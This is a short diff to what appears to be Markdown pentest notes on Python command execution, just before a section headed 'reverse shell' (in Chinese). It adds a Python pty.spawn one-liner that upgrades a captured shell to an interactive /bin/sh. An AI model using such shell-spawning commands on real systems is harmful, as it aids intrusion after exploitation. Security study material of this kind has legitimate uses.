@@ -9,6 +9,9 @@ subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE,stderr=subproces
 import os
 os.system('ls')
 ```
+```sh
+python -c 'import pty;pty.spawn("/bin/sh");' 
+```
 ## 反弹shell
 ```py
 #!/usr/bin/env python
